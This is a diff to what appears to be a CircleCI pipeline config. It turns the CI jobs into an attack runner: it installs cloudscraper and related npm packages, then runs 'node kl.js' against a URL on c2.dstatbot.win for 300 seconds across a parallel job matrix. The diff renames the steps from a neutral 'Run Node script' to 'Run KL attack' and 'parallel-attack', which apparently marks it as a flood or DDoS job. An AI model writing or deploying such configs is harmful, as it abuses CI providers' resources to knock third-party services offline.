@@ -12,15 +12,18 @@ jobs:
     steps:
       - checkout
       - run:
-          name: Install system dependencies
-          command: sudo apt-get update && sudo apt-get install -y gcc build-essential & npm install cloudscraper request randomstring
+          name: Install dependencies
+          command: |
+            sudo apt-get update
+            sudo apt-get install -y build-essential
+            npm install cloudscraper request randomstring
       - run:
-          name: Run Node script
-          command: node kl.js https://c2.dstatbot.win/8e406482-5116-4dc4-8f97-c330cd82972e 300
+          name: Run KL attack
+          command: node kl.js https://c2.dstatbot.win/352db00b-5f01-4bc1-b414-8c7e4c127cf4 300 
 
 workflows:
   version: 2
-  parallel-gcc-jobparallel-gcc-jobs:
+  parallel-attack:
     jobs:
       - build-and-run:
           matrix:
